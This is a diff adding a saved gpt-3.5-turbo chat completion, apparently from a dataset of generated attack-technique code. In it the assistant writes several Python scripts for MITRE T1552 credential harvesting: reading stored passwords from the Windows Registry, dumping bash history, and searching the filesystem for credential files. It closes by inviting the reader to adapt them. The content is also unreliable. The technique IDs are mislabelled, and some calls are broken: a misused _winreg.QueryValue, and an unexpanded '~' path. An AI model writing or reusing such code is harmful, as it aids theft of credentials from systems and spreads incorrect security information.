@@ -1,0 +1,22 @@
+{
+  "id":"chatcmpl-8UB7mH6IOsSRVKKjhs46PwmgL4NtU",
+  "object":"chat.completion",
+  "created":1702203294,
+  "model":"gpt-3.5-turbo-0613",
+  "choices":[
+    {
+      "index":0,
+      "message":{
+        "role":"assistant",
+        "content":"[Feasible]\n\nT1552.001-Query Registry: Adversaries may search the Registry on compromised systems for insecurely stored credentials.\n\nMethod 1:\nPackages used: winreg\nFunctionality used: OpenKey, QueryValueEx\n\n```python\nimport winreg\n\ndef query_registry_key(key_path):\n    try:\n        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)\n        value, _ = winreg.QueryValueEx(key, \"Password\")\n        print(value)\n\n    except WindowsError:\n        print(\"Registry key not found\")\n\nquery_registry_key(\"Software\\\\Example\\\\Credentials\")\n```\n\nMethod 2:\nPackages used: _winreg\nFunctionality used: OpenKeyEx, QueryValue\n\n```python\nimport _winreg\n\ndef query_registry_key(key_path):\n    try:\n        key = _winreg.OpenKeyEx(_winreg.HKEY_CURRENT_USER, key_path)\n        value = _winreg.QueryValue(key, \"Password\")\n        print(value)\n\n    except WindowsError:\n        print(\"Registry key not found\")\n\nquery_registry_key(\"Software\\\\Example\\\\Credentials\")\n```\n\nMethod 3:\nPackages used: pywin32\nFunctionality used: OpenKey, QueryValue\n\n```python\nimport win32api\nimport win32con\n\ndef query_registry_key(key_path):\n    try:\n        key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, key_path)\n        value, _ = win32api.RegQueryValueEx(key, \"Password\")\n        print(value)\n\n    except WindowsError:\n        print(\"Registry key not found\")\n\nquery_registry_key(\"Software\\\\Example\\\\Credentials\")\n```\n\nNote: The key path may vary depending on the specific Registry key you want to query.\n\nT1552.002-Query Bash History: Adversaries may search the bash command history on compromised systems for insecurely stored credentials.\n\nMethod 1:\nPackages used: pathlib\nFunctionality used: read_text, expanduser\n\n```python\nfrom pathlib import Path\n\ndef query_bash_history():\n    try:\n        path = Path(\"~/.bash_history\").expanduser()\n        content = path.read_text()\n        print(content)\n\n    except FileNotFoundError:\n        print(\"Bash history file not found\")\n\nquery_bash_history()\n```\n\nMethod 2:\nPackages used: None\nFunctionality used: open\n\n```python\ndef query_bash_history():\n    try:\n        with open(\"~/.bash_history\", \"r\") as file:\n            content = file.read()\n            print(content)\n\n    except FileNotFoundError:\n        print(\"Bash history file not found\")\n\nquery_bash_history()\n```\n\nT1552.007-Collect Stored Credentials from Local File Systems:\nAdversaries may search local file systems for files containing insecurely stored credentials.\n\nMethod 1:\nPackages used: pathlib\nFunctionality used: rglob\n\n```python\nfrom pathlib import Path\n\ndef find_credentials_file():\n    try:\n        path = Path(\"/\").rglob(\"*credentials*\")\n        for file in path:\n            print(file)\n\n    except PermissionError:\n        print(\"Permission denied\")\n\nfind_credentials_file()\n```\n\nMethod 2:\nPackages used: os\nFunctionality used: walk\n\n```python\nimport os\n\ndef find_credentials_file():\n    try:\n        for root, _, files in os.walk(\"/\"):\n            for file in files:\n                if \"credentials\" in file.lower():\n                    print(os.path.join(root, file))\n\n    except PermissionError:\n       print(\"Permission denied\")\n\nfind_credentials_file()\n```\n\nPlease note that method 1 and method 2 for T1552.007 may return a large number of files. It's important to filter and analyze the results further to determine if any of the files contain insecurely stored credentials.\n\nThis code aims to demonstrate how to implement the different methods to achieve the functionality described by T1552. Please modify and customize the code based on your specific requirements and environment."
+      },
+      "finish_reason":"stop"
+    }
+  ],
+  "usage":{
+    "prompt_tokens":948,
+    "completion_tokens":804,
+    "total_tokens":1752
+  },
+  "system_fingerprint":null
+}
